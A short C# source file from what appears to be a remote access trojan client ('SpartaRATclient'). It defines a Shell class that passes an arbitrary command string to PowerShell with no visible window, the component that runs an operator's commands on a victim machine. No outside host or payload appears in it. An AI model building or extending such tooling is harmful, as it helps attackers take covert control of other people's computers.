﻿using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace SpartaRATclient.Tools
{
    public class Shell
    {
        public void Run(string command)
        {
            Process Process = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "powershell.exe",
                    Arguments = "/C " + command,
                    UseShellExecute = false,
                    CreateNoWindow = true
                }
            };
            Process.Start();
            Process.WaitForExit();
        }

    }
}
